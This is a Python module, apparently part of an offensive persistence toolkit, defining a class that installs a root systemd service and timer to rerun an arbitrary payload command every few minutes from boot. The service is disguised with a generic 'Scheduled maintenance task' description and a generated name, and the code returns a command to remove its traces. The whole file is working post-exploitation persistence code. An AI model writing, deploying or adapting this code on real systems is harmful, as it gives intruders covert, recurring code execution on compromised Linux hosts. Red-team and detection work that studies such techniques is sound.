import os
from ..core import SystemdPersistence
from ..utils.helpers import run_command, generate_service_name

class TimerServicePersistence(SystemdPersistence):
    def create(self, payload_command: str, service_name: str = None, interval_minutes: int = 10):
        if not self.is_root:
            print("[!] Timer services require root")
            return None

        service_name = service_name or generate_service_name()
        service_file = f"/etc/systemd/system/{service_name}.service"
        timer_file = f"/etc/systemd/system/{service_name}.timer"

        service_content = f"""[Unit]
Description=Scheduled maintenance task

[Service]
Type=oneshot
ExecStart={payload_command}
"""

        timer_content = f"""[Unit]
Description=Scheduled timer for {service_name}

[Timer]
OnBootSec=5min
OnUnitActiveSec={interval_minutes}min
Persistent=true

[Install]
WantedBy=timers.target
"""

        try:
            for path, content in [(service_file, service_content), (timer_file, timer_content)]:
                with open(path, 'w') as f:
                    f.write(content)
                os.chmod(path, 0o644)

            run_command("systemctl daemon-reload")
            run_command(f"systemctl enable --now {service_name}.timer")

            print(f"[+] Timer service created: {service_name}")
            print(f"[+] Interval: {interval_minutes} minutes")
            print(f"[+] Timer: {timer_file}")

            return {
                'method': 'systemd_timer',
                'timer_file': timer_file,
                'remove_command': f"systemctl stop {service_name}.timer; systemctl disable {service_name}.timer; rm -f {service_file} {timer_file}; systemctl daemon-reload"
            }
        except Exception as e:
            print(f"[-] Error: {e}")
            return None